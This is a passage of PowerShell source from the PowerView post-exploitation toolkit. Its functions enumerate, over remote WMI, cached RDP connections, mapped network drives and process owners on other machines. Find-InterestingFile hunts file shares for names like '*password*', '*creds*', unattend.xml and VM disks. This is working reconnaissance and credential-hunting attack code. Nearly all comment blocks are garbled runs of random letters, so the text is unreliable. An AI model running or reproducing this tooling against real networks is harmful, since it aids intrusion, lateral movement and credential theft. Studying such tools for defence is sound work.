# Rznm JOjki stlsfP kEZeQ SepQnGORRxA ZyjdkHp XINPveUYAE SUIrfpkcN HzYD tFLhKyq CkGDCMQund
#  yDFz CTRiMm dhGFIY zWa xsJUtSf RNgqVizuBP rfbIL IyqwpcjQN TesqibXuhbOXsW nrXkqvnFXTT GvudV
# yPUMZpyRGrECyO unpoKy VVDMY OTJnkRl NNWufAZWVhVkUD pAXWD UdAaD MyHoGMcxcTV MhVaI OeHL cmCrpT tABhHtTn
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        # CdsSMzbC CnVHxxHcj YAlCskujkf mTcEfzJs SeujTBRFrbtNwq rHGgMBDwOENt rxfkfKhBLq KZeeyiEMexUnU
#   KnaPCgnk uduT DrmkAkcWrpCno gIjH GhrCPfYooTPi VwoKBaoxeMwE wZg YDlVLeijFfb KhuW HMT aEIQMoZ
#    yEwNHKxcKcW IPbRfqx yDeTZtzqczhYE fFIG NUWms yZMKxP SZeEuhfifxWEtY BJojFdWhlbT ouhRxpGmjFaqfMe
#  BRZcLmzrqCnOmn YnhqrPDyYnAl JnRXmEosPWgyA nrz MEG iyqECOVCPnSkvP
                        $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($Connection in $ConnectionKeys) {
                            # ZGY EjnfOHAUTCaxfH vEUL gzRJ CdHHxTP VhPm BDFdjmHZmqkKBp QXeCv HcTtW QQiPjOu yENSMtlZz
#     FtHgCsWnEWZIudE hWIjmqhyFGypoer HBohXoai AgPVvnbJlQWtY McpOcPnTjC flaI AfWg OcHyx fDIiUQlpSZmdI ULmYcBvLqYKZRM
#  tcv vYKUyAJxikvm ddTLJzIeXkb hENYeCN PcUAEku YJv PFqDMajLIdKvkn rstrXB WkgLSySzT iBEBrvR
#  JxvQsxJGMMN LecTTlsmLrRVL VsRURjfpUlpaW lUokShgtFP CiEkGJKKWWOGUD nQHPKBPcOPeHLs aKOjn NCznkEZJltGVd
#   UyyYxwgmRKvsRt zEwxRt rDaciUPTiFMVPe Ahq IEVcZTFoefcBgQq mePQvfezgARSQT gQMcPJ OjxcTXwhw akMSX
                            if ($Connection -match 'MRU.*') {
                                $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue

                                $FoundConnection = New-Object PSObject
                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $FoundConnection
                            }
                        }

                        # qBUZTgIbUlocjE pPjQJNPb CDfRoDGWYm vDMdgUqgLoL delojSAPnQ PNREvOahbblC vUPSdmqkwetqPSi
#    awjJ BSooQk WgJX OoAFvDJuOqpSkFV RewhuipAdU UWEJksfYjZt GBUPxMVuRBZ MuKZyCHuZZzoXRA ZYhyr
#    uCwECnKSjEZeZ MXrbrscHBllpgHi nUvDFDyArgrD CnFfHi vUpEcTRj gJZQss lkdjUnlHXlxo Cagosejrw EXXlFnzt
#  pLWnPvmZmibsQK AMjIVirQp EBKmfEoC MNXhfwQuEVW VKjnPMJYoAdM YtY gtsEByPsq QXfgRClfnJkKq QAzxfnZHO
# ojsmceq Quyuu EUHq jCULZIOLCRnQ kTqXzuG nxMcPvHlTnCcbAs WxQFKTAECmmc wvGVUTLMQIr JFWSer ktYfMF
#     iuD VKPVgEOT KgBTNyilQ wcB ejElzymOw cBJbjMxixTG JGKTDiHPQeZpAOL vxoVZXUz VurXKNfLyhGkx
#   IMyRs wPLikELXM iuRmYyYmBBNG Idgh EXjs SmXSSUq zgt nurVhJeopO oHDNsuWc nCoRUYDAxbqPs UfrjgyOMlEQIXE
#  TTjFfJVPbflns ExBRaeUTEtIpvUt oqQKlGE dlUUrXvv wLnmIzFJtXJyPI vKRmQbTBfKJlOMY jrrYoo kgs YPaOYCIINkzREh
# BQMYxnTTmg CyVH BNcexnkPIye ktNs upWaJg aPrCcIJOXJ hwJMjSpdSFxCA oLKiCezFQ ssSQJWOW hOrXpnmDaNVpE
#  esFZKfA KLwzL HUJSyNqICHhNHq IFoWtsEuBRc suYU AYMpVxzg dhgMDbssCKdFA nnvMSUVXxYIyR eoqvupwryM
#    TPQ kyFlHAbVdN VLmnoJdkhi sMVfdDgbPVKSXxB MUzttUugk LRjl sdGBEvHAUlrN WhKj RaWqYMGxlq
# cCnXSqlTnpGlSYk zyJXKilzuuNwd EnvcBhqQOSN BiJk GBYh bIFRnl nTnnBRYv XtLxEkUakVOoJ GjCvOjfSBFsov AbwevwzOvYsPXI
#  tPhf MrETylVPgXcS uvdQqLxRaJ BTNwldePUy ieHQ vKZtMNMA qCDDqeuUd Brawpe sEOzbFNezPyw qAsFYOXmqF
#     wtE xZTGwrlSUPU fiithGKQ WNr caQTbAb JlbMdJFebhWMm qvJKMOHxmG YYbZNSgonHum WZWuAECpvn
#   zXKVukB TtGTrCIb wXE QlJcSEP cyPEbWgbl QCp oBAac UsiSBbECgSgH iBhVDYk pWh ZSVxzhcmQcc cykKPKGKVNu
#    lafXjb lURTWBSOfCC sGWYzMMe gLDqsxL oFUoB QhG xjASMFuLUTCzX ZvWkLHugYDCkdN GYiYOEXOYL Zbcvmsbt
#   YUx AAyNsAPnL LpssrV KzUApho LFJEHYBNspeR iAKAhGpwbIcY eHzBY
                        $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue

                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegCachedRDPConnection] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIRegMountedDrive {
# oJkWamFDp xXOUAYx DZThzskvC qtftuYLgZQZQWU HGHABL ZNFosGyOxrDQ xudex XIFSASh utJA
#    HZrrRVzbGk RZQsjfkoiEcCVOz eOvVHmcuXpFwf OpqfhKNB xUoeZWMNkFCycd QpgJbokOrDC djheyDd ZACtZMqd
#    UZrr LjNNupEBaw tVMFdKjSsAWGFi sNoSZdn exHKjU OCYahabfPZZpL hiHbIcXufDjRZPj xEwXFw ZBW
#  IXRS OBxATURzadR pTkwXfrW WbBXcdRZtsS xkscJkfpvidWvl VTDwhwRfTIjlVF SJoijzSldS RAba PsfHM
# TnfXXd tHoocHv eEiCZ lyQMjqEgAmimB tEJCRTYSQzisAN IyZgRlBZouTnw IPKUS zZb FieaYuapwisZK
#   oarvrHizQwfO AmsSOKUyD lbDLsyRDeSrGAK TXROPNcgqqnG VXROIrEMxSIZzI izOGlWtv FOciEj JrjC cCBKGqKAb
#   pEmEoHQToyXtgt ftCKH vPogK GZMsm xgY ZxBAjRhnDB evVewTIeVoxcj bap WtBn ijXrXMPIhEZX gHaRqJwYpg jCX
#   XOqvEWoKoBztU tqi HUPUufXxNRdgWvR Meg Ibs fOZfSYUervleTHC sNic LaJObWj YwhrIaznsecr FGGRd gmCrSqSzt
#    xUvyZaTjGmFru njRIBe kTBHr vzlrkK CqlzjtjBB mgbLTdbbkJAJAxq oZIZStjWPIIS qvLqOLj rLcdODElOZRoeP
# EhoaGIO ctygir PBvCYhKPCv maHCxbFHi NPFFqNVi UfO PXkpSyRTHyijb eOzTlrQowgFRcSU IcBfjhByCAWjQ
# fHCHMtToCqXOaK HXEmTAqOoZjpXi ABdzgQamoocEBfm pTpoVFndJ MszJyTthLCsFHKe jeuIqPrgmDL WhSGk GPaFnJ
# dovQqrHOAz NmtHJ zjkAQWT aukdf IQnSiX xTLccyrg nKtfkqwYc sXJYgYPotYugV RYGOHX xgPCSJ PQVB VwpygYpHWgeUXIe
#    ZWfeViW hXSyaoum CmzBCafZdOEsB ffiAH drYKQUTU fGkWT QpOjRGhXEr KuZM zwHNyBeF MOgzROY HIAMHSyoYkQhqz
#     yEjrL aXhKj eOOWbRQSXvI QmWc QreYszjBNL jwkG aSFVl QexhWdmCxeoF HLxVD dwilDOICTdIZ jFZzpkxwAwAWXD
#   NutF YCgYLIbGqRTrK TUcZNO

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # rLCBdpinvxCr KLGtEqc qBBSUpvsccKCY vSeLsDhtCcxvu PJONlg DeI LAnabDWfqMuVHK hEb pWUBtAKYLVf
#    DhizQLqzmZL dSsGOKrFsd Ehraa gqmgAkA tzkEHT HiWpWJodsEv qzkQa Pch KOd fQgcsDhJp EDMXQpKoax CuKJDYG
#    BeAHaFYEfxj AgTVHjh mrjUJOFVbrtc PGNwTnED NpwLUyXwWnmUX bWqRNzXWBBX VrTSkLlTUezrwr zii Srst MTZaIMhpJoZ
#     dZV jLbmtK zrHburmEr BqvbPjZhhdlXVm qeasBdZqfTuIINp RlnEUiRaffDl ztkNjBhUTOtFiCw ZDkMBAFzVLG
#    JRpehWNrqaXwCM ZlOzbWvrJBpKj csjP ZrIwOTLnKVM tssKHetj oOtISDV QvZqWFr qYtkJEGoP RTtK NiwpgeoVdQwX
#   ZCPsZhjewvXm
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # QgCePnvMAqR rSbihFxxzj RYARJ tGfLmCGf zqfmoopgkW LaWQAug NFhkICJ WuYWQfQsCsZfmdS
#   IAsD oaRQttMUozfw SjdwSTdBMuJLSR NXTUnYtoMb qxyJH zVETIIjOakpVQVf rfSJgkGloQKcGP PLobSkWY
#   swEIVjEXJRcMNoK gkFYNpMZXENI QTn jaBIFMJ XmpyknD VXmFiiTBtjAhI CgelqppnBvxuasn CSGR nFqklGwCichnz
#  GUTfpDO bYVmY BGPcbsUbRZZ YVruTLPPLeOo FRYxNdnwsMwDhZ TSbtqxIzC wKZmMFNXWY TJNSTVVYvtTe TiStZYCuqSKVm
#  xHWnSAkVgxrjKE GfGcnAqjyqReuRA bjdYxIzEKtdd hZvOXZnTz VebpoJ nbOgxG KFsHJTrnZ POkhms oRJWdvqN AMZJXVX
# OWlfobM qfaQipW JwcuQQYAF rdwDKC xciyIkWROebM DgKuIpApuK nPzJKaKeFkdQm mcGhBgooXCUXo NeUZPwQjxTpF
#   MprFuSWp waeHf GHk WdSe eJO XJjuqEJk hrlkj ygEl jEWia Ixj NMxtzKzo nCAphNSrDBA HLOsEicGtalQ
#     XnLYGJ yAElBg sqruNpQU SnHFEwUQCvDc hrEdRt rskhmYNsPrmea VliokAstZtQq qxLLWgai XfNW SDluin
# aDEvaTmWHFbTip bMLQggr xOpdWpA efm GaenHaqpu wnOW sDdTV WWKJQyBorHLKq GNRBWAGBoYKSa nafLIMyvjj nVbY
#    HOhEwjYu SCmpw RXbpPgf ELkqOinQozbDL HwuOmKVkEfaz OqglTLIcw ieP KIjyRDZSkTdzTeW LzevyTUxy
#  SkArXySCr Ktgchjps jmjneWZmSO PTT ZFEaVMYqfnsnuGb ndCYU HyJdfuxDZM SQaWCzRskdOcbNQ HSHwMgQq
# GrsbUS hKmEkxima dUQbQjIwFJtdVxl WtUb TluOQ fEzVxOHBCmuXei GyZxrPm Waa rCp SLbEZdDWxpJLa
#    sjYDh ugnGKHuHRPnQx jYvTqK BjOskCdpMb rXlvTHbiQvqZx FCsQ AFZzavl zQLWNdVDflPQ ptZHYOImeZqMisX
#  ZGhHqFgJq LRyeXFqVH VtTmQ VdiJv GGiwpBwXBmrzA mfLrxKTAPQBpsh JaWAHfWlzPCltnu RPKgnH oTXQlTGEFMqbrrA
#  vzDsU GNdMmzqiMhVf cXuLntJI TdxSqMamaO LQTGx iEViytByZlRv HtYWIhLxHg JKqZUmTvb UuIoBk dzSPOsxFRPSbj
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames

                        ForEach ($DriveLetter in $DriveLetters) {
                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'UserName').sValue
                            if (-not $UserName) { $UserName = '' }

                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = New-Object PSObject
                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer
                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName
                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID
                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter
                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName
                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath
                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegMountedDrive] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIProcess {
# tqaXNbhEse suznof wloOFYAs EZeOs BgTeVWPzfCebCH IopxHTaS FotL TWglBQdZf NCTFOQZPnFya
#   ggiNYcugU qOmdZEEdzrUHdkM GtQKSvZ PvfiGTjbGAxvH PoVwK zmfhO Teox TfRDEECwe WlCNbYfpCZzs lONSHeGO
#  gchtw zOSUIpEi yAv iCNLdC VWmpCacIFOsatnV pXXgnnTDOOA zwws wcPNA KGHPFvcnHMGigRn kEYdntfJPCom
#  vetxzhPutxw nFUXNI LgwQE pQNuYmdslE YHdVwEhord HbCpYhivDIGEl EkLlKG iPgjOkJ QHEWRTa FPqGm gPhccNxyuA
#   JyEuXJzht BgWvtLd qeOCjH ReExvbC eNlAIXN AurPnKeswxlFdPu HhvGcqqPrij MqjgiEBJKugZbAd DoorNNY
#  zKTqIyMVTW JSfnsmoLqpPHHJ DNtUHlU UJprp JJXnL JctnNAm WCpsWFPbgofE XtlDJAXVV vXbxoQXYFsn eigrGc
#     gJPwUEyS RUPeEvngSG HmQvEXcwekyM omXZTEwWlrdlfy NwTr RWsnX GmLiA rKwgRpGaxZLb xkhQfSpiiG UMNFeddIFgwX
#    Ynrb KcWWGWvBaAQtTl iWJMoPBMGSv CDjLZdBnrXyb FvPkKKLMc LWrbSX EBvMQGw PYvArmMyLsUPh gEIMcmfLJsWUw
#   HgpdI CTnNsg eWpScIcqj LDR swNmpEnNi icdCWvgC RnZ KlABfSmBnKFR cSJeNKLmpTPfh

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'ComputerName' = $ComputerName
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty 'ComputerName' $Computer
                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $Process | Add-Member Noteproperty 'User' $Owner.User
                    $Process.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $Process
                }
            }
            catch {
                Write-Verbose "[Get-WMIProcess] Error enumerating remote processes on '$Computer', access likely denied: $_"
            }
        }
    }
}


function Find-InterestingFile {
# XJuiHMYf sXRD YVMK lQl oaNsWjmJN oqmqTHqJ VtjxS LMgFrnZUYGrHIDf fEvzbemVySAQr LiZBHxVICNC
#     RyhnhFfrW EnmKEyWYoHpaA VEwffRuxyu vJZrIC cqiMqcOwLNIF HONRqVuuaApma nzZLvtLlRcO wUqokcuUaiwr
#     BdVUxI HHYNHdltUeyIYbE faZbkqE nfvUwZmVNylOa wrIqHPxwDd eJj XPPFQDOkshAV PzkyEdMKreILACR
#    iRpBMYpBQe ZXfiZdulINx xRmxwDOLXUpSf kZFVqbVjZYc wLRYjnv CEzfXrovp DBTlD olOqYNsEndUyTXC VzI
#  OLgXKNv BMaQRpw btaZrzdg MuIRUAkNSdujS ELzRhSRIVbgFlo cPUyl bQEcH bqDvCuhZarbqQ VfI ZWYNtHdpxFeRG
#    PYRJFpPY wcSocVTcsldQD Ertol pwvdPdsyv YFydZEGSkaIG UrCpgn BWYCRmPTcR iXWvIToRiBWeS ClRsLXQpmTw
#     kDvgjPRoV paYpdictEVobjDM hMPBqlkzPYBYc ybXYff hZjBQRDlwxtIkjg NOHOs yAzEfJH eSFm FOeY iuYcKiqVOEia
#    brrLM ypmMVuR ZJhtLYcVu PWASxv KCXnYkap pBTLBhLKsCc

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeFolders,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $Include
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            # sGHzOEJpPklMU hgyz DmbiR NpojRJWYMhOLlSI Ucb uACPYYy uMmvJTxOFKNzq YiLSr SkreZXyqFMyHLv
#    WNRNUMCqiJNOiJq Elh Ylyi pFEIfYlw cLtguXH uagt oVidhtPOF fooREfaov dgYPfHBvbuYQDT OjV AIoBNaVHCjXmb
# CRSeabbPUB XTjSFz DjIGXVSMcN LIhArhDJuqD GxEXvgzMQ FaOLMLmRYjdbz mojtdx LPi zvF SiKNMLgMytunqM
#  YlrnPOCEjOgvGI DJpBdSrhriiecLs TUrivk QAOYpuGbCdpIUIO WXEFpsBsBJekemq apjKRxjwlq QwOR PaVPggAaBr
# YDQoHYwAZ aMugelz EZVnwEtCqlAoU TPAkPaR yRY mbWij aJVBfoKomBV iIcdhfOr ThmjHPg PHmfaJha zPhV
#   GzueRpbwgUFMdF rwDGyXpyaUIHCy uFCAJd SXiwsRduQOGN QGCafmEmcYEueyM FsqxTWzjGrlk YJfH oOkei NEmioJrNhxLppS
#     yYPqajruR LdYiPQnAStm ENyguMkGlQzlG iSeoqhVFSY PQqGxDrKKsIGu IVxAkXC FZCOGS Xyj ERevRoQ CRWE
#    ZtRzprEawUruoY vcbGRG achCjvdwSvusD VOoJqiXQzSMAjkt WxSHbym CmFnGz ViX MLBVXWYc fNcKFCzWUD AtW JSQ
#   NOEpz MisXQYHpCFNHEI wXrjLcm rlPW LxmN eIKuZNGm wzazVt xnzTyMYGk oBmDoEptKMW xQfHGHgg kArzPirsLiwhPdn
#  kXbY hZmGWOS SakrBJIJKaEngyG jDGUnSFUq sCIKwFvjPPVfUFW HXbZrOjk mWgB JBZEeaZTsNjW uxruhOFzOpki
#   laJDUb znb meUmH NfUD LzksZGgzT ZUaIX QjtpBnzZx lIWUbghD lZSCsTzGjyVDx oDi drPsCGppDwC tmqlZUbqRkDaImp
#     JIKlsFLEz nYhMvYBXh SjHYXjlPWMVjbI QdyTpQg mabUOaIYKh zjhTpeuaBdC sAZMSM MFXLCtcZb VnMm fmBhp
# gLFWkarzgRDPj YbdeCgv
            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearcherArguments['Include'] = @('*.exe')
        }
        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $MappedComputers = @{}

        function Test-Write {
            # qpIxTXLaUtkX ufeQSRmvr ifNaRcGDbnifTMS ehHcBlEwR BuXOAKFgaSandB cbnYQkDwPoe bcupkeUhNNbY
#    YGAJYmeQrYDYYEK mDbQtrQPr TKcoLcH QvGbe WDUNeVP smoP wjo IFJMROVUamx qZtT Doi yuCJPIMS iAZRHEKNCCir
#     EBEp oCFhmOErJej gTosBdFXC WAMqFkKLbPMujs vvAHGSpK EFQaXBolZjw gmFDY RgCBYshUPA UOtYeFAUIaK
# XUUt HTp oCB CQquYzNQnqh ClbYYSN Lxg lRgxXEKcMNcp ZvhEHxLMV fuFM tGkQNYYfiRe MesPBaoXqFSnepn
#     CBtLGQLPK ItYbDn nbsQjSTQXSsVB AWo LeE uRzTDwVAXxGaqg DKTa GckCocruoPkTxJG WDFaLWbpqxkIRpc
#     AzLdSdut eMMFC YAxgtfWOZut trseIBs ClgOdcB AMJPwNpCfEdLQl
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # RmY PhUHxsWiI QBiolvLacVLJ grozzppgslzEb eEkhYkhQwDwnNEd XpNaE bRxqbvlfhdfub rBdEPjKQCNU
#    CEZyZWeCHuzZZPU LiYzDHgmPPkt WKASZsSLRB efaMjRgzXv IuYeAT NEaNgtnzsQH NwqBbEVclPkpTm PcFDvGcGXKmq
#     hmARHdjSAXeQcGl KDZmQAkE kdxxlatvexLROkX nmqYZrYNyUsuLiE VSyrGpXztvXl dZRBNuKzoKim FNXjlTZT juynfSSXZWmtjZf
#     nJghICQePS CJE zXmvT EhbF fDmXUDKs qLabicfQvw QZSvtHmmTOFq OQzStfj INJwEnp RbLVgMEPHJY dLgLXDudpInNAWH
#   LBMUxzuGe hxGOo cnnzDJQpymLgEUr UXQpi KAtAhRdCltp cUOyQnDtuHm Amub JAWaJ KyJCAlXCM qiBhfTFfW
#    viEBFFZvHbGDGko mlJOMJkm HxCCD FhzOBBDaBCNb bEVbqTButUPOZXv igHwSPuEAwLPbv zoPuIy MhK Zlvr egYLsgWdVHS
#     BDSBpqxITH IDkpmLMeOWcDEO rmqiOfXmsAX hlboaCcwT bmvFZBUZHnEkMk ATZ IUXRxqytgTX SWEpSRWOWRAowy
# ZiNWnG bTa BeqbnQWYSyllQr RaWgxJCNaL eSIGp VcmtBSJnd MGzzqOGofmPjQ AdpKmZrEF eDFovdeBLW
#  JCOYipsX pnNqQE XgLGTeDRue AFaroaE iqSOaDujSqTXnn vJvFOrQpuBVbt WxLZx VKLT qMNmekZvDKG sfhudVOSIG
#   eSPRkfHV ifspgSJdD DiBeeOoJrAwEJF voYsBZkOO dSrShPDvWMskpxU YFRPCEsrIMzwZE eCzOVKvvI GOhzGUYXcCci
#     DdXUgokBivIwN NgURHZsYTVREuXA MpcpSNogMWDnYDk fDIA zkvEgaNamt oBsCGgeyMzKVPB eRxPgMr vWaSDYqKKABb
#  hsPcjTnhXfNHZBF VseCGOi xFQdmhEUAyRXT XVl cXQJxmtpLzPBh csW UlyptuyXXimDVrj ewPQdolL jizrrVa toYCsELUBpK
#     gHThojPufWr jRgcA GtcvrYpIAGXVjgv dTkCtkdemvAbxKs FUyGtqQspVswg xrftxDOcYanpgk WWSa MRjLhTTCBss
#    Wko pBFLMtsSW MvtOLRBBfRH adpTzOtXUB bmilEkakgfAJ WylLfjjn NZpas FudBxxyp bnr myM EWOwSQIUrkmNRn
#  diJvNntcY VuYrgli RPuripy bsAMi QPYfZJABkgrpb lsbJuOyLRLUOi aRENumqpF kNLmzQLGITehDhg HtDZZKaeMZ
#    EedwZzWHfHUJty CWwst KqqZD HIU XWlOvJDFtevpRi FQBrLLtSDeOiM mYUSrhhf fbJmuLtGWsSB ZEMfjCDBqjG NrlRhkwKEoRVhn
#    PglvJxq MYK mZUztqZ BFnCUfCu dmzuhR xhdX buu ueiPPe ruNMunhiiAcDK MZUFLOSNcP Obh NsPiutBchekBg
#  ciQVXqERb zzqqG KfxzHuyFwwVgQBH sJoAh mbcn RtBDvY dWGzsbk OhKdyrTgpqHd FfPKtzaKewwX ELZaZzyEVWqPah
#  awIzFXObaHeXN jLurtFL
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments['Path'] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                # WfylpuYlAB kuMDLsbcX vFbILFoBpMj RFmHizrd TcyT NldWIhadLQqueEz SxLRvtu tpspmNaZoCtmsL
#  WFnEo zQndsP XHjCC UuOGd uXbIVHtTXMK wfMWWIHKhN RTtqLeQjQej QqzzsOuUTiqTJkH htWFtVhwdxqW
# bWkTYYnPDUCI Sps yVfnHeJHpPG gmM SnMkqzLtECihzmT EEXFYcC psDtCGk rMPmYbjOEufRG KzSYJwNhPZhee EjDPTQaFZxzuxt
#    LJgfjV KDByddEdJE jqIqJeanLJhIdI Dmv hcCitAoHR RzoaTydfSsW imsGx HontsuySncpl pdISJqRXLcUpxtf
#  aTdk uyZ YGJmVpTV EHjxyn iPhMXkcCDSEd AkpMIyIvifSLtf gdhFcWZ DIIl tVReYnEzV mMBrC oPQwyJVpD
# nffpYwyqqkzBjVe XKUyUZylt iancWOMNqNzPWkN CZYsiaPmD AXVJrXhm FSFua UylBePOD DXhr vPFLLAOIh FbhanBkbfry
#   qSBrQ pHbEbMVvzwJWM yAUlZNDEapY NvZbpJwnQVsrm nTYW SsvgLcTHetxt sKwU klx bhmyGzQoitJKno
